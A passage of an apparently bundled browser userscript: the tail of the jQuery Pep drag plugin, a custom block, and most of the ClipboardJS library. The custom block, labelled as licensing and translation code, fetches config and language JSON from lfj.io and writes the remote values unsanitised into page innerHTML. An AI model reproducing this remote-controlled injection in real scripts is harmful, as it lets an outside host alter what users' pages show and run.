        upperYLimit       = this.$container.height() - (this.options.useBoundingClientRect ? this.$el[0].getBoundingClientRect().height : this.$el.outerHeight());

        // is our object trying to move outside lower X & Y limits?
        if ( this.pos.x + dx < 0 )              hash.x = 0;
        if ( this.pos.y + dy < 0 )              hash.y = 0;
      }

      // is our object trying to move outside upper X & Y limits?
      if ( this.pos.x + dx > upperXLimit )    hash.x = upperXLimit;
      if ( this.pos.y + dy > upperYLimit )    hash.y = upperYLimit;

      // Account for translation, which makes movement a little tricky.
      if ( this.shouldUseCSSTranslation() && accountForTranslation ){
        if (hash.x === lowerXLimit && this.xTranslation() ) hash.x = lowerXLimit - this.xTranslation();
        if (hash.x === upperXLimit && this.xTranslation() ) hash.x = upperXLimit - this.xTranslation();

        if (hash.y === lowerYLimit && this.yTranslation() ) hash.y = lowerYLimit - this.yTranslation();
        if (hash.y === upperYLimit && this.yTranslation() ) hash.y = upperYLimit - this.yTranslation();
      }

      return hash;
    };

    //  getCSSEaseHash();
    //    returns a hash of params used in conjunction
    //    with this.options.cssEaseString
    Pep.prototype.getCSSEaseHash = function(reset){
      if ( typeof(reset) === 'undefined' ) reset = false;

      var cssEaseString;
      if (reset){
        cssEaseString = '';
      } else if ( this.CSSEaseHash ) {
        return this.CSSEaseHash;
      } else {
        cssEaseString = ['all', this.options.cssEaseDuration + 'ms', this.options.cssEaseString].join(' ');
      }

      return {
                    '-webkit-transition'   : cssEaseString,   // chrome, safari, etc.
                       '-moz-transition'   : cssEaseString,   // firefox
                        '-ms-transition'   : cssEaseString,   // microsoft
                         '-o-transition'   : cssEaseString,   // opera
                            'transition'   : cssEaseString    // future
            };
    };

    // calculateActiveDropRegions()
    //    sets parent droppables of this.
    Pep.prototype.calculateActiveDropRegions = function() {
      var self = this;
      this.activeDropRegions.length = 0;

      $.each( $(this.options.droppable), function(idx, el){
        var $el = $(el);
        if ( self.isOverlapping($el, self.$el) ){
          $el.addClass(self.options.droppableActiveClass);
          self.activeDropRegions.push($el);
        } else {
          $el.removeClass(self.options.droppableActiveClass);
        }
      });

    };

    //  isOverlapping();
    //    returns true if element a over
    Pep.prototype.isOverlapping = function($a,$b) {

      if ( this.options.overlapFunction ) {
        return this.options.overlapFunction($a,$b);
      }

      var rect1 = $a[0].getBoundingClientRect();
      var rect2 = $b[0].getBoundingClientRect();

      return !( rect1.right   < rect2.left  ||
                rect1.left    > rect2.right ||
                rect1.bottom  < rect2.top   ||
                rect1.top     > rect2.bottom  );
    };

    //  isTouch();
    //    returns whether or not event is a touch event
    Pep.prototype.isTouch = function(ev){
      return ev.type.search('touch') > -1;
    };

    // isPointerEventCompatible();
    //    return whether or note our device is pointer
    //    event compatible; typically means where on a
    //    touch Win8 device
    Pep.prototype.isPointerEventCompatible = function() {
      return ("MSPointerEvent" in window);
    };

    // applyMSDefaults();
    Pep.prototype.applyMSDefaults = function(first_argument) {
      this.$el.css({
          '-ms-touch-action' :    'none',
          'touch-action' :        'none',
          '-ms-scroll-chaining':  'none',
          '-ms-scroll-limit':     '0 0 0 0'
      });
    };

    //  isValidMoveEvent();
    //    returns true if we're on a non-touch device -- or --
    //    if the event is **single** touch event on a touch device
    Pep.prototype.isValidMoveEvent = function(ev){
      return ( !this.isTouch(ev) || ( this.isTouch(ev) && ev.originalEvent && ev.originalEvent.touches && ev.originalEvent.touches.length === 1 ) );
    };

    //  shouldUseCSSTranslation();
    //    return true if we should use CSS transforms for move the object
    Pep.prototype.shouldUseCSSTranslation = function() {

      if ( this.options.forceNonCSS3Movement )
        return false;

      if ( typeof(this.useCSSTranslation) !== "undefined" )
        return this.useCSSTranslation;

      var useCSSTranslation = false;

      if ( !this.options.useCSSTranslation || ( typeof(Modernizr) !== "undefined" && !Modernizr.csstransforms)){
        useCSSTranslation = false;
      }
      else{
        useCSSTranslation = true;
      }

      this.useCSSTranslation =  useCSSTranslation;
      return useCSSTranslation;
    };

    //  cssAnimationsSupported():
    //    returns true if the browser supports CSS animations
    //    which are used for easing..
    Pep.prototype.cssAnimationsSupported = function() {

      if ( typeof(this.cssAnimationsSupport) !== "undefined" ){
        return this.cssAnimationsSupport;
      }

      // If the page has Modernizr, let them do the heavy lifting.
      if ( ( typeof(Modernizr) !== "undefined" && Modernizr.cssanimations) ){
        this.cssAnimationsSupport = true;
        return true;
      }

      var animation = false,
          elm = document.createElement('div'),
          animationstring = 'animation',
          keyframeprefix = '',
          domPrefixes = 'Webkit Moz O ms Khtml'.split(' '),
          pfx  = '';

      if( elm.style.animationName ) { animation = true; }

      if( animation === false ) {
        for( var i = 0; i < domPrefixes.length; i++ ) {
          if( elm.style[ domPrefixes[i] + 'AnimationName' ] !== undefined ) {
            pfx = domPrefixes[ i ];
            animationstring = pfx + 'Animation';
            keyframeprefix = '-' + pfx.toLowerCase() + '-';
            animation = true;
            break;
          }
        }
      }

      this.cssAnimationsSupport = animation;
      return animation;
    };

    //  hardwareAccelerate();
    //    add fool-proof CSS3 hardware acceleration.
    Pep.prototype.hardwareAccelerate = function() {
      this.$el.css({
        '-webkit-perspective':          1000,
        'perspective':                  1000,
        '-webkit-backface-visibility':  'hidden',
        'backface-visibility':          'hidden'
      });
     };

    //  getMovementValues();
    //    returns object pos, event position, and velocity in each direction.
    Pep.prototype.getMovementValues = function() {
      return { ev: this.ev, pos: this.pos, velocity: this.velocity() };
     };

    //  buildDebugDiv();
    //    Create a little div in the lower right corner of the window
    //    for extra info about the object currently moving
    Pep.prototype.buildDebugDiv = function() {

      // Build the debugDiv and it's inner HTML -- if necessary
      var $debugDiv;
      if ( $('#pep-debug').length === 0 ){
        $debugDiv = $('<div></div>');
        $debugDiv
          .attr('id', 'pep-debug')
          .append("<div style='font-weight:bold; background: red; color: white;'>DEBUG MODE</div>")
          .append("<div id='pep-debug-event'>no event</div>")
          .append("<div id='pep-debug-ev-coords'>event coords: <span class='pep-x'>-</span>, <span class='pep-y'>-</span></div>")
          .append("<div id='pep-debug-pos-coords'>position coords: <span class='pep-x'>-</span>, <span class='pep-y'>-</span></div>")
          .append("<div id='pep-debug-velocity'>velocity: <span class='pep-x'>-</span>, <span class='pep-y'>-</span></div>")
          .append("<div id='pep-debug-delta'>&Delta; movement: <span class='pep-x'>-</span>, <span class='pep-y'>-</span></div>")
          .css({
            position:   'fixed',
            bottom:     5,
            right:      5,
            zIndex:     99999,
            textAlign:  'right',
            fontFamily: 'Arial, sans',
            fontSize:   10,
            border:     '1px solid #DDD',
            padding:    '3px',
            background: 'white',
            color:      '#333'
          });
      }

      var self = this;
      setTimeout(function(){
        self.debugElements = {
          $event:      $("#pep-debug-event"),
          $velocityX:  $("#pep-debug-velocity .pep-x"),
          $velocityY:  $("#pep-debug-velocity .pep-y"),
          $dX:         $("#pep-debug-delta .pep-x"),
          $dY:         $("#pep-debug-delta .pep-y"),
          $evCoordsX:  $("#pep-debug-ev-coords .pep-x"),
          $evCoordsY:  $("#pep-debug-ev-coords .pep-y"),
          $posCoordsX: $("#pep-debug-pos-coords .pep-x"),
          $posCoordsY: $("#pep-debug-pos-coords .pep-y")
        };
      }, 0);

      $('body').append( $debugDiv );
    };

    // log()
    Pep.prototype.log = function(opts) {
      if ( !this.options.debug ) return;

      switch (opts.type){
      case "event":
        this.debugElements.$event.text(opts.event);
        break;
      case "pos-coords":
        this.debugElements.$posCoordsX.text(opts.x);
        this.debugElements.$posCoordsY.text(opts.y);
        break;
      case "event-coords":
        this.debugElements.$evCoordsX.text(opts.x);
        this.debugElements.$evCoordsY.text(opts.y);
        break;
      case "delta":
        this.debugElements.$dX.text(opts.x);
        this.debugElements.$dY.text(opts.y);
        break;
      case "velocity":
        var vel = this.velocity();
        this.debugElements.$velocityX.text( Math.round(vel.x) );
        this.debugElements.$velocityY.text( Math.round(vel.y) );
        break;
      }
    };

    // toggle()
    //  toggle the pep object
    Pep.prototype.toggle = function(on) {
      if ( typeof(on) === "undefined"){
        this.disabled = !this.disabled;
      }
      else {
        this.disabled = !on;
      }
    };

    //  *** Special Easings functions ***
    //    Used for JS easing fallback
    //    We can use any of these for a
    //    good intertia ease
    $.extend($.easing,
    {
      easeOutQuad: function (x, t, b, c, d) {
        return -c *(t/=d)*(t-2) + b;
      },
      easeOutCirc: function (x, t, b, c, d) {
        return c * Math.sqrt(1 - (t=t/d-1)*t) + b;
      },
      easeOutExpo: function (x, t, b, c, d) {
        return (t===d) ? b+c : c * (-Math.pow(2, -10 * t/d) + 1) + b;
      }
    });

    //  wrap it
    //    A really lightweight plugin wrapper around the constructor,
    //    preventing against multiple instantiations.
    $.fn[pluginName] = function ( options ) {
      return this.each(function () {
        if (!$.data(this, 'plugin_' + pluginName)) {
          var pepObj = new Pep( this, options );
          $.data(this, 'plugin_' + pluginName, pepObj);
          $.pep.peps.push(pepObj);
        }
      });
    };

    //  The   _   ___ ___
    //       /_\ | _ \_ _|
    //      / _ \|  _/| |
    //     /_/ \_\_| |___|
    //
    $.pep = {};
    $.pep.peps = [];
    $.pep.toggleAll = function(on){
      $.each(this.peps, function(index, pepObj){
        pepObj.toggle(on);
      });
    };

    $.pep.unbind = function($obj){
      $.each($obj, function(index, pepObj) {
        pepObj = $(pepObj);
        var pep = pepObj.data('plugin_' + pluginName);

        if ( typeof pep === 'undefined' )
          return;

        pep.toggle(false);
        pep.unsubscribe();
        pepObj.removeData('plugin_' + pluginName);
      });
    };


  //______________________________________________________________________________
var HLANG=[];
window._lfjkm={};
function  reLANG(){var allDom = document.getElementsByTagName("*");for(var i =0; i < allDom.length; i++){var elem = allDom[i];var key = elem.getAttribute('data-tag');if(key != null) {elem.innerHTML = HLANG[key]  ;}}
}


function lfj_license(){
GM_xmlhttpRequest({
  method: "GET",
  responseType:'json',
  synchronous:false,
  overrideMimeType:'application/json',
  url: '//lfj.io/module/serverjs.json?v='+Math.random(),
  onreadystatechange: function (svj) {
    if(svj.readyState=='4' && svj.status === 200){
    							var respomr;
    							try{respomr=svj.responseText.replace(/(?:\r\n|\r|\n)/g,"");} catch(e){respomr=svj.responseText;}
				var jlsgObject = JSON.parse(respomr);
					jlsgObject=JSON.stringify(jlsgObject);
    	      var timejls = parseInt(Math.floor(Date.now() / 1000))+30;
    	      var svjirs = {'config':jlsgObject,'time':timejls};
    	      GM_setValue('_lfjkm',JSON.stringify(svjirs))
    	      _lfjkm=svjirs.config;


	}
	}
})
}



if(GM_getValue('_lfjkm')){
var	vjkm=	JSON.parse(GM_getValue('_lfjkm'));
	var timecusc = Math.floor(Date.now() / 1000);
		if (vjkm['time']< timecusc) {lfj_license();}
		_lfjkm=JSON.parse(vjkm['config']);

} else {lfj_license();}



function hTranslate() {
    //initialization
    this.init =  function(attribute, lng){
        this.attribute = attribute;
        this.lng = lng;
    }
    this.process = function(){_self = this;
    var fetchri = true;

 if (localStorage.getItem('_lang') || GM_getValue('_lang')){
   var langsave = JSON.parse(GM_getValue('_lang')?GM_getValue('_lang'):localStorage.getItem('_lang'));
   var timecusc = Math.floor(Date.now() / 1000);
    if (langsave['time']< timecusc) {
      fetchri = true;

    } else {
    	if(!localStorage.getItem('_lang')){fetchri = true;}
    	else if(!GM_getValue('_lang')){fetchri = true;}
    	else{fetchri = false;}

       HLANG=JSON.parse(langsave['val']);
       reLANG();

    }

 } else{fetchri = true;}


if (fetchri == true){






GM_xmlhttpRequest({
  method: "GET",
  responseType:'json',
  synchronous:false,
  overrideMimeType:'application/json',
  url: '//lfj.io/module/lang/'+this.lng+'.json?v='+Math.random(),
  onreadystatechange: function (lang) {
    if(lang.readyState=='4' && lang.status === 200){

      var LngObject = JSON.parse(lang.responseText.replace(/(?:\r\n|\r|\n)/g,""));
      var langostore = {};
      langostore['time'] = parseInt(Math.floor(Date.now() / 1000))+300;
      langostore['val'] = JSON.stringify(LngObject);
      localStorage.setItem('_lang',JSON.stringify(langostore));
      GM_setValue('_lang',JSON.stringify(langostore));

      HLANG=LngObject;
      reLANG();

    }
  }})






}

}
}



function hlangload(){
var AUTOLNG;
if (navigator.languages[0].match(/zh|tw/i)) {AUTOLNG='cn';}
else if (navigator.languages[0].match(/vi|vn/i)) {AUTOLNG='vi';}
else{AUTOLNG='en';}
    var translate = new hTranslate();
    var currentLng = AUTOLNG;
    var attributeName = 'data-tag';
    translate.init(attributeName, currentLng);
    translate.process();
 }

hlangload();
  //____________________________________________________________________________________
  (function webpackUniversalModuleDefinition(root, factory) {
      if(typeof exports === 'object' && typeof module === 'object')
          module.exports = factory();
      else if(typeof define === 'function' && define.amd)
          define([], factory);
      else if(typeof exports === 'object')
          exports["ClipboardJS"] = factory();
      else
          root["ClipboardJS"] = factory();
  })(this, function() {
  return /******/ (function(modules) { // webpackBootstrap
  /******/ 	// The module cache
  /******/ 	var installedModules = {};
  /******/
  /******/ 	// The require function
  /******/ 	function __webpack_require__(moduleId) {
  /******/
  /******/ 		// Check if module is in cache
  /******/ 		if(installedModules[moduleId]) {
  /******/ 			return installedModules[moduleId].exports;
  /******/ 		}
  /******/ 		// Create a new module (and put it into the cache)
  /******/ 		var module = installedModules[moduleId] = {
  /******/ 			i: moduleId,
  /******/ 			l: false,
  /******/ 			exports: {}
  /******/ 		};
  /******/
  /******/ 		// Execute the module function
  /******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
  /******/
  /******/ 		// Flag the module as loaded
  /******/ 		module.l = true;
  /******/
  /******/ 		// Return the exports of the module
  /******/ 		return module.exports;
  /******/ 	}
  /******/
  /******/
  /******/ 	// expose the modules object (__webpack_modules__)
  /******/ 	__webpack_require__.m = modules;
  /******/
  /******/ 	// expose the module cache
  /******/ 	__webpack_require__.c = installedModules;
  /******/
  /******/ 	// define getter function for harmony exports
  /******/ 	__webpack_require__.d = function(exports, name, getter) {
  /******/ 		if(!__webpack_require__.o(exports, name)) {
  /******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
  /******/ 		}
  /******/ 	};
  /******/
  /******/ 	// define __esModule on exports
  /******/ 	__webpack_require__.r = function(exports) {
  /******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
  /******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
  /******/ 		}
  /******/ 		Object.defineProperty(exports, '__esModule', { value: true });
  /******/ 	};
  /******/
  /******/ 	// create a fake namespace object
  /******/ 	// mode & 1: value is a module id, require it
  /******/ 	// mode & 2: merge all properties of value into the ns
  /******/ 	// mode & 4: return value when already ns object
  /******/ 	// mode & 8|1: behave like require
  /******/ 	__webpack_require__.t = function(value, mode) {
  /******/ 		if(mode & 1) value = __webpack_require__(value);
  /******/ 		if(mode & 8) return value;
  /******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
  /******/ 		var ns = Object.create(null);
  /******/ 		__webpack_require__.r(ns);
  /******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
  /******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
  /******/ 		return ns;
  /******/ 	};
  /******/
  /******/ 	// getDefaultExport function for compatibility with non-harmony modules
  /******/ 	__webpack_require__.n = function(module) {
  /******/ 		var getter = module && module.__esModule ?
  /******/ 			function getDefault() { return module['default']; } :
  /******/ 			function getModuleExports() { return module; };
  /******/ 		__webpack_require__.d(getter, 'a', getter);
  /******/ 		return getter;
  /******/ 	};
  /******/
  /******/ 	// Object.prototype.hasOwnProperty.call
  /******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
  /******/
  /******/ 	// __webpack_public_path__
  /******/ 	__webpack_require__.p = "";
  /******/
  /******/
  /******/ 	// Load entry module and return exports
  /******/ 	return __webpack_require__(__webpack_require__.s = 6);
  /******/ })
  /************************************************************************/
  /******/ ([
  /* 0 */
  /***/ (function(module, exports) {

  function select(element) {
      var selectedText;

      if (element.nodeName === 'SELECT') {
          element.focus();

          selectedText = element.value;
      }
      else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
          var isReadOnly = element.hasAttribute('readonly');

          if (!isReadOnly) {
              element.setAttribute('readonly', '');
          }

          element.select();
          element.setSelectionRange(0, element.value.length);

          if (!isReadOnly) {
              element.removeAttribute('readonly');
          }

          selectedText = element.value;
      }
      else {
          if (element.hasAttribute('contenteditable')) {
              element.focus();
          }

          var selection = window.getSelection();
          var range = document.createRange();

          range.selectNodeContents(element);
          selection.removeAllRanges();
          selection.addRange(range);

          selectedText = selection.toString();
      }

      return selectedText;
  }

  module.exports = select;


  /***/ }),
  /* 1 */
  /***/ (function(module, exports) {

  function E () {
    // Keep this empty so it's easier to inherit from
    // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
  }

  E.prototype = {
    on: function (name, callback, ctx) {
      var e = this.e || (this.e = {});

      (e[name] || (e[name] = [])).push({
        fn: callback,
        ctx: ctx
      });

      return this;
    },

    once: function (name, callback, ctx) {
      var self = this;
      function listener () {
        self.off(name, listener);
        callback.apply(ctx, arguments);
      };

      listener._ = callback
      return this.on(name, listener, ctx);
    },

    emit: function (name) {
      var data = [].slice.call(arguments, 1);
      var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
      var i = 0;
      var len = evtArr.length;

      for (i; i < len; i++) {
        evtArr[i].fn.apply(evtArr[i].ctx, data);
      }

      return this;
    },

    off: function (name, callback) {
      var e = this.e || (this.e = {});
      var evts = e[name];
      var liveEvents = [];

      if (evts && callback) {
        for (var i = 0, len = evts.length; i < len; i++) {
          if (evts[i].fn !== callback && evts[i].fn._ !== callback)
            liveEvents.push(evts[i]);
        }
      }

      // Remove event from queue to prevent memory leak
      // Suggested by https://github.com/lazd
      // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

      (liveEvents.length)
        ? e[name] = liveEvents
        : delete e[name];

      return this;
    }
  };

  module.exports = E;
  module.exports.TinyEmitter = E;


  /***/ }),
  /* 2 */
  /***/ (function(module, exports, __webpack_require__) {

  var is = __webpack_require__(3);
  var delegate = __webpack_require__(4);

  /**
   * Validates all params and calls the right
   * listener function based on its target type.
   *
   * @param {String|HTMLElement|HTMLCollection|NodeList} target
   * @param {String} type
   * @param {Function} callback
   * @return {Object}
   */
  function listen(target, type, callback) {
      if (!target && !type && !callback) {
          throw new Error('Missing required arguments');
      }

      if (!is.string(type)) {
          throw new TypeError('Second argument must be a String');
      }

      if (!is.fn(callback)) {
          throw new TypeError('Third argument must be a Function');
      }

      if (is.node(target)) {
          return listenNode(target, type, callback);
      }
      else if (is.nodeList(target)) {
          return listenNodeList(target, type, callback);
      }
      else if (is.string(target)) {
          return listenSelector(target, type, callback);
      }
      else {
          throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
      }
  }

  /**
   * Adds an event listener to a HTML element
   * and returns a remove listener function.
   *
   * @param {HTMLElement} node
   * @param {String} type
   * @param {Function} callback
   * @return {Object}
   */
  function listenNode(node, type, callback) {
      node.addEventListener(type, callback);

      return {
          destroy: function() {
              node.removeEventListener(type, callback);
          }
      }
  }

  /**
   * Add an event listener to a list of HTML elements
   * and returns a remove listener function.
   *
   * @param {NodeList|HTMLCollection} nodeList
   * @param {String} type
   * @param {Function} callback
   * @return {Object}
   */
  function listenNodeList(nodeList, type, callback) {
      Array.prototype.forEach.call(nodeList, function(node) {
          node.addEventListener(type, callback);
      });

      return {
          destroy: function() {
              Array.prototype.forEach.call(nodeList, function(node) {
                  node.removeEventListener(type, callback);
              });
          }
      }
  }

  /**
   * Add an event listener to a selector
   * and returns a remove listener function.
   *
   * @param {String} selector
   * @param {String} type
   * @param {Function} callback
   * @return {Object}
   */
  function listenSelector(selector, type, callback) {
      return delegate(document.body, selector, type, callback);
  }

  module.exports = listen;


  /***/ }),
  /* 3 */
  /***/ (function(module, exports) {

  /**
   * Check if argument is a HTML element.
   *
   * @param {Object} value
   * @return {Boolean}
   */
  exports.node = function(value) {
      return value !== undefined
          && value instanceof HTMLElement
          && value.nodeType === 1;
  };

  /**
   * Check if argument is a list of HTML elements.
   *
   * @param {Object} value
   * @return {Boolean}
   */
  exports.nodeList = function(value) {
      var type = Object.prototype.toString.call(value);

      return value !== undefined
          && (type === '[object NodeList]' || type === '[object HTMLCollection]')
          && ('length' in value)
          && (value.length === 0 || exports.node(value[0]));
  };

  /**
   * Check if argument is a string.
   *
   * @param {Object} value
   * @return {Boolean}
   */
  exports.string = function(value) {
      return typeof value === 'string'
          || value instanceof String;
  };

  /**
   * Check if argument is a function.
   *
   * @param {Object} value
   * @return {Boolean}
   */
  exports.fn = function(value) {
      var type = Object.prototype.toString.call(value);

      return type === '[object Function]';
  };


  /***/ }),
  /* 4 */
  /***/ (function(module, exports, __webpack_require__) {

  var closest = __webpack_require__(5);

  /**
   * Delegates event to a selector.
   *
   * @param {Element} element
   * @param {String} selector
   * @param {String} type
   * @param {Function} callback
   * @param {Boolean} useCapture
   * @return {Object}
   */
  function _delegate(element, selector, type, callback, useCapture) {
      var listenerFn = listener.apply(this, arguments);

      element.addEventListener(type, listenerFn, useCapture);

      return {
          destroy: function() {
              element.removeEventListener(type, listenerFn, useCapture);
          }
      }
  }

  /**
   * Delegates event to a selector.
   *
   * @param {Element|String|Array} [elements]
   * @param {String} selector
   * @param {String} type
   * @param {Function} callback
   * @param {Boolean} useCapture
   * @return {Object}
   */
  function delegate(elements, selector, type, callback, useCapture) {
      // Handle the regular Element usage
      if (typeof elements.addEventListener === 'function') {
          return _delegate.apply(null, arguments);
      }

      // Handle Element-less usage, it defaults to global delegation
      if (typeof type === 'function') {
          // Use `document` as the first parameter, then apply arguments
          // This is a short way to .unshift `arguments` without running into deoptimizations
          return _delegate.bind(null, document).apply(null, arguments);
      }

      // Handle Selector-based usage
      if (typeof elements === 'string') {
          elements = document.querySelectorAll(elements);
      }

      // Handle Array-like based usage
      return Array.prototype.map.call(elements, function (element) {
          return _delegate(element, selector, type, callback, useCapture);
      });
  }

  /**
   * Finds closest match and invokes callback.
   *
   * @param {Element} element
   * @param {String} selector
   * @param {String} type
   * @param {Function} callback
   * @return {Function}
   */
  function listener(element, selector, type, callback) {
      return function(e) {
          e.delegateTarget = closest(e.target, selector);

          if (e.delegateTarget) {
              callback.call(element, e);
          }
      }
  }

  module.exports = delegate;


  /***/ }),
  /* 5 */
  /***/ (function(module, exports) {

  var DOCUMENT_NODE_TYPE = 9;

  /**
   * A polyfill for Element.matches()
   */
  if (typeof Element !== 'undefined' && !Element.prototype.matches) {
      var proto = Element.prototype;

      proto.matches = proto.matchesSelector ||
                      proto.mozMatchesSelector ||
                      proto.msMatchesSelector ||
                      proto.oMatchesSelector ||
                      proto.webkitMatchesSelector;
  }

  /**
   * Finds the closest parent that matches a selector.
   *
   * @param {Element} element
   * @param {String} selector
   * @return {Function}
   */
  function closest (element, selector) {
      while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
          if (typeof element.matches === 'function' &&
              element.matches(selector)) {
            return element;
          }
          element = element.parentNode;
      }
  }

  module.exports = closest;


  /***/ }),
  /* 6 */
  /***/ (function(module, __webpack_exports__, __webpack_require__) {

  "use strict";
  __webpack_require__.r(__webpack_exports__);

  // EXTERNAL MODULE: ./node_modules/select/src/select.js
  var src_select = __webpack_require__(0);
  var select_default = /*#__PURE__*/__webpack_require__.n(src_select);

  // CONCATENATED MODULE: ./src/clipboard-action.js
  var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

  var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

  function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }



  /**
   * Inner class which performs selection from either `text` or `target`
   * properties and then executes copy or cut operations.
   */

  var clipboard_action_ClipboardAction = function () {
      /**
       * @param {Object} options
       */
      function ClipboardAction(options) {
          _classCallCheck(this, ClipboardAction);

          this.resolveOptions(options);
          this.initSelection();
      }

      /**
       * Defines base properties passed from constructor.
       * @param {Object} options
       */


      _createClass(ClipboardAction, [{
          key: 'resolveOptions',
          value: function resolveOptions() {
              var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

              this.action = options.action;
              this.container = options.container;
              this.emitter = options.emitter;
              this.target = options.target;
              this.text = options.text;
              this.trigger = options.trigger;

              this.selectedText = '';
          }

          /**
           * Decides which selection strategy is going to be applied based
           * on the existence of `text` and `target` properties.
           */

      }, {
          key: 'initSelection',
          value: function initSelection() {
              if (this.text) {
                  this.selectFake();
              } else if (this.target) {
                  this.selectTarget();
              }
          }

          /**
           * Creates a fake textarea element, sets its value from `text` property,
           * and makes a selection on it.
           */

      }, {
          key: 'selectFake',
          value: function selectFake() {
              var _this = this;

              var isRTL = document.documentElement.getAttribute('dir') == 'rtl';

              this.removeFake();

              this.fakeHandlerCallback = function () {
                  return _this.removeFake();
              };
              this.fakeHandler = this.container.addEventListener('click', this.fakeHandlerCallback) || true;

              this.fakeElem = document.createElement('textarea');
              // Prevent zooming on iOS
              this.fakeElem.style.fontSize = '12pt';
              // Reset box model
              this.fakeElem.style.border = '0';
              this.fakeElem.style.padding = '0';
              this.fakeElem.style.margin = '0';
              // Move element out of screen horizontally
              this.fakeElem.style.position = 'absolute';
              this.fakeElem.style[isRTL ? 'right' : 'left'] = '-9999px';
              // Move element to the same position vertically
              var yPosition = window.pageYOffset || document.documentElement.scrollTop;
              this.fakeElem.style.top = yPosition + 'px';

              this.fakeElem.setAttribute('readonly', '');
              this.fakeElem.value = this.text;

              this.container.appendChild(this.fakeElem);

              this.selectedText = select_default()(this.fakeElem);
              this.copyText();
          }

          /**
           * Only removes the fake element after another click event, that way
           * a user can hit `Ctrl+C` to copy because selection still exists.
           */

      }, {
          key: 'removeFake',
          value: function removeFake() {
              if (this.fakeHandler) {
                  this.container.removeEventListener('click', this.fakeHandlerCallback);
                  this.fakeHandler = null;
                  this.fakeHandlerCallback = null;
              }

              if (this.fakeElem) {
                  this.container.removeChild(this.fakeElem);
                  this.fakeElem = null;
              }
          }

          /**
           * Selects the content from element passed on `target` property.
           */

      }, {
          key: 'selectTarget',
          value: function selectTarget() {
              this.selectedText = select_default()(this.target);
              this.copyText();
          }

          /**
           * Executes the copy operation based on the current selection.
           */

      }, {
          key: 'copyText',
          value: function copyText() {
              var succeeded = void 0;

              try {
                  succeeded = document.execCommand(this.action);
              } catch (err) {
                  succeeded = false;
              }

              this.handleResult(succeeded);
          }

          /**
           * Fires an event based on the copy operation result.
           * @param {Boolean} succeeded
           */

      }, {
          key: 'handleResult',
          value: function handleResult(succeeded) {
              this.emitter.emit(succeeded ? 'success' : 'error', {
                  action: this.action,
                  text: this.selectedText,
                  trigger: this.trigger,
                  clearSelection: this.clearSelection.bind(this)
              });
          }

          /**
           * Moves focus away from `target` and back to the trigger, removes current selection.
           */

      }, {
          key: 'clearSelection',
          value: function clearSelection() {
              if (this.trigger) {
                  this.trigger.focus();
              }
              document.activeElement.blur();
              window.getSelection().removeAllRanges();
          }

          /**
           * Sets the `action` to be performed which can be either 'copy' or 'cut'.
           * @param {String} action
           */

      }, {
          key: 'destroy',


          /**
           * Destroy lifecycle.
           */
          value: function destroy() {
              this.removeFake();
          }
      }, {
          key: 'action',
          set: function set() {
              var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 'copy';

              this._action = action;

              if (this._action !== 'copy' && this._action !== 'cut') {
                  throw new Error('Invalid "action" value, use either "copy" or "cut"');
              }
          }

          /**
           * Gets the `action` property.
           * @return {String}
           */
          ,
          get: function get() {
              return this._action;
          }

          /**
           * Sets the `target` property using an element
           * that will be have its content copied.
           * @param {Element} target
           */

      }, {
          key: 'target',
          set: function set(target) {
              if (target !== undefined) {
                  if (target && (typeof target === 'undefined' ? 'undefined' : _typeof(target)) === 'object' && target.nodeType === 1) {
                      if (this.action === 'copy' && target.hasAttribute('disabled')) {
                          throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
                      }

                      if (this.action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
                          throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
                      }

                      this._target = target;
                  } else {
                      throw new Error('Invalid "target" value, use a valid Element');
                  }
              }
          }

          /**
           * Gets the `target` property.
           * @return {String|HTMLElement}
           */
          ,
          get: function get() {
              return this._target;
          }
      }]);

      return ClipboardAction;
  }();

  /* harmony default export */ var clipboard_action = (clipboard_action_ClipboardAction);
  // EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
  var tiny_emitter = __webpack_require__(1);
  var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);

  // EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
  var listen = __webpack_require__(2);
  var listen_default = /*#__PURE__*/__webpack_require__.n(listen);

  // CONCATENATED MODULE: ./src/clipboard.js
  var clipboard_typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

